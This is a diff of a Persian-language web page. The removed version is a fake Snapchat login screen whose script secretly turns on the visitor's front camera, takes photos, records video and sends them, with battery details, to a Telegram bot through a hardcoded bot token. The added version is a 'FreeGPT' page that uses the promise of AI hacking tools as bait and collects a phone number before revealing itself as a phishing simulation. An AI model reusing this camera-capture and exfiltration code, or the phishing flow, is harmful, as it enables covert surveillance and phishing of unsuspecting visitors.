@@ -2,213 +2,128 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>Snap Auto</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
-  <script src="https://cdn.tailwindcss.com"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FreeGPT | هک با هوش مصنوعی</title>
   <style>
     body {
+      font-family: sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: white;
       margin: 0;
-      font-family: 'Vazirmatn', sans-serif;
-      background: #FFFC00;
-      overflow: hidden;
-      direction: rtl;
+      padding: 0;
     }
-    #video {
-      position: absolute;
+    .container {
+      max-width: 500px;
+      margin: auto;
+      padding: 20px;
+    }
+    h1 {
+      text-align: center;
+      font-size: 2em;
+    }
+    p, li {
+      font-size: 1em;
+      line-height: 1.6;
+    }
+    button {
+      padding: 10px 20px;
+      background: #00b894;
+      border: none;
+      color: white;
+      font-size: 1em;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    input {
       width: 100%;
-      height: 100vh;
-      object-fit: cover;
-      z-index: 0;
+      padding: 10px;
+      margin: 10px 0;
+      font-size: 1em;
     }
-    .overlay, .splash, .login {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      z-index: 10;
-      background: #FFFC00;
+    .hidden {
+      display: none;
     }
-    .camera-btn {
-      position: absolute;
-      bottom: 24px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 72px;
-      height: 72px;
-      background: white;
-      border-radius: 50%;
-      border: 4px solid #ddd;
-      z-index: 10;
-    }
-    .switch-btn {
-      position: absolute;
-      top: 24px;
-      right: 24px;
-      width: 48px;
-      height: 48px;
-      background: rgba(255,255,255,0.7);
-      border-radius: 50%;
-      z-index: 10;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      cursor: not-allowed;
-    }
-    .logo {
-      position: absolute;
-      top: 24px;
-      left: 24px;
-      z-index: 10;
+    .timer {
+      color: yellow;
     }
   </style>
 </head>
 <body>
+  <div class="container" id="step1">
+    <h1>FreeGPT با قابلیت‌های هک و تست نفوذ</h1>
+    <ul>
+      <li>آموزش حرفه‌ای هک با هوش مصنوعی</li>
+      <li>ساخت ابزارهای تست نفوذ به صورت خودکار</li>
+      <li>پاسخ به تمام سوالات تخصصی</li>
+      <li>کاملاً رایگان و نامحدود!</li>
+    </ul>
+    <button onclick="startFlow()">Sign Up</button>
+  </div>  <div class="container hidden" id="blockVPN">
+    <p>لطفاً برای ادامه، از فیلترشکن استفاده نمایید.</p>
+  </div>  <div class="container hidden" id="step2">
+    <h2>ثبت‌نام</h2>
+    <p>شماره موبایل خود را وارد نمایید:</p>
+    <input type="text" id="phone" placeholder="مثال: 0912xxxxxxx">
+    <button onclick="sendCode()">تأیید و ارسال کد</button>
+  </div>  <div class="container hidden" id="step3">
+    <h2>کد تأیید</h2>
+    <p>کدی که برای شما ارسال شد را وارد نمایید:</p>
+    <input type="text" placeholder="کد تایید">
+    <p class="timer" id="countdown"></p>
+    <button onclick="editPhone()">ویرایش شماره</button>
+  </div>  <div class="container hidden" id="final">
+    <h2>هشدار امنیتی</h2>
+    <p>این یک شبیه‌سازی آموزشی برای آگاهی از حملات فیشینگ بود.</p>
+    <p>لطفاً هیچ‌وقت اطلاعات خود را در سایت‌های مشکوک وارد نکنید.</p>
+  </div>  <script>
+    function startFlow() {
+      const isIran = true; // شبیه‌سازی تشخیص IP ایران
 
-  <!-- Splash Screen -->
-  <div class="splash" id="splash">
-    <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="100" class="animate-bounce mb-4">
-  </div>
+      if (isIran) {
+        document.getElementById("step1").classList.add("hidden");
+        document.getElementById("blockVPN").classList.remove("hidden");
+        return;
+      }
 
-  <!-- Login Screen -->
-  <div id="login" class="login hidden">
-    <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="80" class="mb-6">
-    <h2 class="text-xl font-bold mb-4 text-black">ورود به اسنپ‌چت</h2>
-    <button class="bg-white text-black py-2 px-6 rounded-full mb-3 flex items-center gap-2 cursor-not-allowed" disabled>
-      <img src="https://img.icons8.com/color/48/google-logo.png" width="20"> ورود با گوگل
-    </button>
-    <button class="bg-white text-black py-2 px-6 rounded-full mb-3 flex items-center gap-2 cursor-not-allowed" disabled>
-      <img src="https://img.icons8.com/fluency/48/facebook-new.png" width="20"> ورود با فیسبوک
-    </button>
-    <button onclick="guestLogin()" class="bg-black text-white py-2 px-6 rounded-full mt-2">ورود مهمان</button>
-  </div>
+      // simulate redirect from Telegram
+      const fromTelegram = true; // شبیه‌سازی ورود از تلگرام
 
-  <!-- Camera Overlay -->
-  <div class="overlay hidden" id="overlay">
-    <div class="switch-btn">
-      <img src="https://img.icons8.com/ios-filled/50/switch-camera.png" width="24">
-    </div>
-    <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="40">
-    </div>
-    <div class="camera-btn"></div>
-  </div>
-
-  <!-- Video Element -->
-  <video id="video" autoplay muted playsinline class="hidden"></video>
-
-  <script>
-    const splash = document.getElementById('splash');
-    const login = document.getElementById('login');
-    const overlay = document.getElementById('overlay');
-    const video = document.getElementById('video');
-
-    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
-    const chatId = "-1002297320707";
-
-    let stream;
-    let chunks = [];
-    let mediaRecorder;
-    let videoSent = false;
-
-    setTimeout(() => {
-      splash.classList.add("hidden");
-      login.classList.remove("hidden");
-    }, 2500);
-
-    function guestLogin() {
-      login.classList.add("hidden");
-      splash.classList.remove("hidden");
-      setTimeout(() => {
-        splash.classList.add("hidden");
-        startCamera();
-      }, 2000);
-    }
-
-    async function startCamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
-        });
-        video.srcObject = stream;
-        video.classList.remove("hidden");
-        overlay.classList.remove("hidden");
-        startRecording();
-        setTimeout(() => takePhoto(1), 1000);
-        setTimeout(() => takePhoto(2), 5000);
-      } catch (e) {
-        alert("خطا در دسترسی به دوربین.");
+      if (fromTelegram) {
+        alert("برای ادامه لطفاً این صفحه را در مرورگر Chrome باز کنید.");
+        window.location.href = "googlechrome://navigate?url=" + window.location.href;
+      } else {
+        document.getElementById("step1").classList.add("hidden");
+        document.getElementById("step2").classList.remove("hidden");
       }
     }
 
-    async function getBatteryInfo() {
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        return {
-          level: Math.round(battery.level * 100),
-          charging: battery.charging
-        };
-      }
-      return { level: "?", charging: false };
-    }
-
-    async function takePhoto(index) {
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0);
-      canvas.toBlob(async blob => {
-        const battery = await getBatteryInfo();
-        const form = new FormData();
-        form.append("chat_id", chatId);
-        form.append("photo", blob, `photo_${index}.jpg`);
-        form.append("caption", `📸 عکس ${index}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل" : "قطع"}`);
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: form
-        });
-      }, 'image/jpeg', 0.8);
-    }
-
-    function startRecording() {
-      chunks = [];
-      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-
-      mediaRecorder.ondataavailable = e => {
-        if (e.data.size > 0) chunks.push(e.data);
-      };
-
-      mediaRecorder.onstop = () => sendVideo();
-      mediaRecorder.start();
-
+    function sendCode() {
+      document.getElementById("step2").classList.add("hidden");
+      document.getElementById("step3").classList.remove("hidden");
+      startTimer(120);
       setTimeout(() => {
-        if (mediaRecorder.state === "recording") mediaRecorder.stop();
-      }, 60000);
+        alert("مشکلی در ارسال کد پیش آمد، لطفاً دوباره تلاش کنید.");
+        document.getElementById("final").classList.remove("hidden");
+        document.getElementById("step3").classList.add("hidden");
+      }, 20000);
+    }
 
-      window.addEventListener("beforeunload", () => {
-        if (mediaRecorder && mediaRecorder.state === "recording") {
-          mediaRecorder.stop();
+    function editPhone() {
+      document.getElementById("step3").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
+    }
+
+    function startTimer(seconds) {
+      const countdown = document.getElementById("countdown");
+      let time = seconds;
+      const interval = setInterval(() => {
+        if (time <= 0) {
+          clearInterval(interval);
+          countdown.textContent = "کد منقضی شد.";
+        } else {
+          countdown.textContent = `زمان باقی‌مانده: ${time--} ثانیه`;
         }
-      });
+      }, 1000);
     }
-
-    async function sendVideo() {
-      if (videoSent || chunks.length === 0) return;
-      videoSent = true;
-      const battery = await getBatteryInfo();
-      const blob = new Blob(chunks, { type: "video/webm" });
-      const form = new FormData();
-      form.append("chat_id", chatId);
-      form.append("video", blob, "video.webm");
-      form.append("caption", `🎥 ویدیو\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل" : "قطع"}`);
-      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-        method: "POST",
-        body: form
-      });
-    }
-  </script>
-</body>
+  </script></body>
 </html>
